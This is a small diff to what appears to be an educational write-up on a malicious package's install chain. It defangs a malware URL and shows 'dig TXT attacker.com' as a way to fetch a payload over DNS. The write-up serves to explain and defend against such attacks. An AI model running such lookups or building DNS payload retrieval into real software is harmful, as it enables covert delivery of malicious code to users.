@@ -66,7 +66,7 @@ init.sh
 Still not obviously malicious. Many packages do this.
 
 ### Step 5 — The shell script queries DNS
-Instead of downloading malware from: https://evil.com/malware.sh, it performs a DNS lookup like:
+Instead of downloading malware from: https://evil[.]com/malware[.]sh, it performs a DNS lookup like:
 ```
 dig TXT attacker.com
 ```
